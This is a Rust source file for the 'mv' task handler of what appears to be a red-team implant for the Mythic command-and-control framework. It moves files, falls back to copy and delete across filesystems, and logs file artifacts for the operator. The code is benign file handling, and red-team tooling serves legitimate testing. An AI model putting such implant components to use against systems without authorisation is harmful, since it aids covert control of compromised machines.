//! Move/rename a file — cross-platform via std::fs::rename.
//! Falls back to copy + delete when crossing filesystem boundaries.
//!
use std::io;
use std::path::Path;

use mythic::{Artifact, TaskMessage, TaskResponse};
use serde::Deserialize;

use crate::common::pathguard::{display_path, normalize_user_path};

/// Platform-specific error code meaning "source and destination are on
/// different filesystems; rename is impossible, copy + delete required".
/// Linux/macOS: EXDEV (BSD/Linux both happen to be 18).
/// Windows:    ERROR_NOT_SAME_DEVICE.
#[cfg(unix)]
const CROSS_DEVICE: i32 = 18; // EXDEV
#[cfg(windows)]
const CROSS_DEVICE: i32 = 17; // ERROR_NOT_SAME_DEVICE

fn is_cross_device(e: &io::Error) -> bool {
    e.raw_os_error() == Some(CROSS_DEVICE)
}

fn temp_path_for(dest: &Path, task_id: uuid::Uuid) -> std::path::PathBuf {
    let mut name = dest
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "move".into());
    name.push_str(&format!(".nanaz-{task_id}.tmp"));
    dest.with_file_name(name)
}

fn replace_with_temp(temp: &Path, dest: &Path) -> Result<(), String> {
    if cfg!(windows) && dest.exists() {
        std::fs::remove_file(dest)
            .map_err(|e| format!("replace {} failed: {e}", display_path(dest)))?;
    }
    std::fs::rename(temp, dest).map_err(|e| {
        format!(
            "move {} to {} failed: {e}",
            display_path(temp),
            display_path(dest)
        )
    })
}

#[derive(Deserialize)]
struct Params {
    src: String,
    dst: String,
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("mv parse error: {e}")),
    };

    let src_str = normalize_user_path(&params.src);
    let dst_str = normalize_user_path(&params.dst);

    let src = Path::new(&src_str);
    let dst = Path::new(&dst_str);

    // Create parent dirs of dst if needed
    if let Some(parent) = dst.parent()
        && !parent.as_os_str().is_empty()
        && let Err(e) = std::fs::create_dir_all(parent)
    {
        return TaskResponse::failed(
            task.id,
            &format!("create parent dir {} failed: {e}", display_path(parent)),
        );
    }

    match std::fs::rename(src, dst) {
        Ok(_) => TaskResponse {
            task_id: task.id,
            completed: Some(true),
            status: Some("completed".into()),
            user_output: Some(format!(
                "moved {} -> {}",
                display_path(src),
                display_path(dst)
            )),
            artifacts: vec![
                Artifact {
                    base_artifact: "FileDelete".into(),
                    artifact: display_path(src),
                    needs_cleanup: false,
                    resolved: true,
                },
                Artifact {
                    base_artifact: "FileWrite".into(),
                    artifact: display_path(dst),
                    needs_cleanup: true,
                    resolved: true,
                },
            ],
            ..Default::default()
        },
        Err(e) if is_cross_device(&e) => {
            // Filesystem boundary — fall back to copy + delete
            let temp_dst = temp_path_for(dst, task.id);
            match std::fs::copy(src, &temp_dst) {
                Ok(n) => {
                    if let Err(e) = replace_with_temp(&temp_dst, dst) {
                        let _ = std::fs::remove_file(&temp_dst);
                        return TaskResponse::failed(task.id, &e);
                    }
                    match std::fs::remove_file(src) {
                        Ok(_) => TaskResponse {
                            task_id: task.id,
                            completed: Some(true),
                            status: Some("completed".into()),
                            user_output: Some(format!(
                                "moved (copy+delete) {} -> {} ({} bytes)",
                                display_path(src),
                                display_path(dst),
                                n
                            )),
                            artifacts: vec![
                                Artifact {
                                    base_artifact: "FileOpen".into(),
                                    artifact: display_path(src),
                                    needs_cleanup: false,
                                    resolved: true,
                                },
                                Artifact {
                                    base_artifact: "FileWrite".into(),
                                    artifact: display_path(dst),
                                    needs_cleanup: true,
                                    resolved: true,
                                },
                                Artifact {
                                    base_artifact: "FileDelete".into(),
                                    artifact: display_path(src),
                                    needs_cleanup: false,
                                    resolved: true,
                                },
                            ],
                            ..Default::default()
                        },
                        Err(e) => TaskResponse::failed(
                            task.id,
                            &format!(
                                "copied {} -> {} but failed to remove source: {e}",
                                display_path(src),
                                display_path(dst)
                            ),
                        ),
                    }
                }
                Err(e) => {
                    let _ = std::fs::remove_file(&temp_dst);
                    TaskResponse::failed(
                        task.id,
                        &format!(
                            "rename and copy both failed for {} -> {}: {e}",
                            display_path(src),
                            display_path(dst)
                        ),
                    )
                }
            }
        }
        Err(e) => TaskResponse::failed(
            task.id,
            &format!(
                "rename {} -> {} failed: {e}",
                display_path(src),
                display_path(dst)
            ),
        ),
    }
}
